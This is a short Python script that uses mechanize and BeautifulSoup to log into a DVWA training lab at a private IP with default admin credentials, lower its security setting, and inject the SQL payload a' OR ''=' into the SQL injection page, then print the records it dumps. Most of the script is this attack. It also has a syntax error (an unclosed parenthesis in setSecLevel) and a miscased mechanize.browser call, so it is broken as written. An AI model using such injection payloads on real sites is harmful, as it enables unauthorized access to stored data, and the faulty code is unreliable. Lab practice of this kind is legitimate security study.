#!/usr/bin/python

import mechanize
from bs4 import BeautifulSoup
import pdb

br=mechanize.browser()

def openPage(url):
	#browser instance
	#it behaves basically as a browser, being able to select forms, going
	# to the previous page, etc.:
	br.open(url)
	br.response().read()

def printForms():
	#find forms in the page:
	print('\nforms on the page:')
	for form in br.forms():
		print(form)

def login():
	br.select_form(nr=0)
	br.form['username'] = 'admin'
	br.form['password'] = 'password'
	br.submit()

def setSecLevel(url):
	openPage(url)
	printForms()
	try:
		print('Setting security to low')
		br.select_form(nr=0)
		br.form.find_control(name="security", kind="list".value = ["low"]
		#submit from the browser:
		br.submit()
		br.response().read()
		printForms()
	except:
		print('error setting security level!')

def checkSQLi(url):
	openPage(url)
	br.select_form(nr=0)
	br.form['id']=r"a' OR ''='"
	br.submit()
	html=br.response().read()

	bs=BeautifulSoup(html)
	IDs=bs.find_all('div', {'class' : 'vulnerable_code_area'})
	for ID in IDs[0].find_all('pre'):
		print(ID)

openPage('http://172.16.94.135/dvwa/')
printForms()
login()
setSecLevel('http://172.16.94.135/dvwa/security.php')
#reference 
checkSQLi('http://172.16.94.135/dvwa/vulnerabilities/sqli/')
